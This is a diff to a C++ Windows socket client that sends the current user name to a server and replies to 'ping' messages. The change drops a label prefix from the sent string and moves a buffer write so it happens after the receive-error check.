@@ -72,7 +72,8 @@ int main(int argc, char const *argv[]) {
 			DWORD username_len = 1024;
 			GetUserName(username, &username_len);
 
-			std::string username_str = "username: " + std::string(username);
+			// std::string username_str = "username: " + std::string(username);
+			std::string username_str = std::string(username);
 			int username_str_len = username_str.length();
 			std::cout << "[!] Sending this to the server: " << username_str << "\n";
 			std::cout << "[!] Length: " << username_str_len << "\n";
@@ -97,17 +98,14 @@ int main(int argc, char const *argv[]) {
 	while (is_connected) {
 		char buffer[1024] = {0};
 		int received = recv(sock, buffer, sizeof(buffer)-1, 0);  // Ensure space for null-termination
-		buffer[received] = '\0';
-
-		std::string converted = std::string(buffer);
-
 		if (received <= 0) {
-			std::string t;
-			std::cout << "[!] Server sent this data: " << received << '\n';
-
+			std::cout << "[!] Server connection closed or error. code: " << received << '\n';
 			is_connected = false;
 			break;
 		}
+
+		buffer[received] = '\0';
+		std::string converted = std::string(buffer);
 
 		if (converted == "ping") {
 			send(sock, "pong", 4, 0);
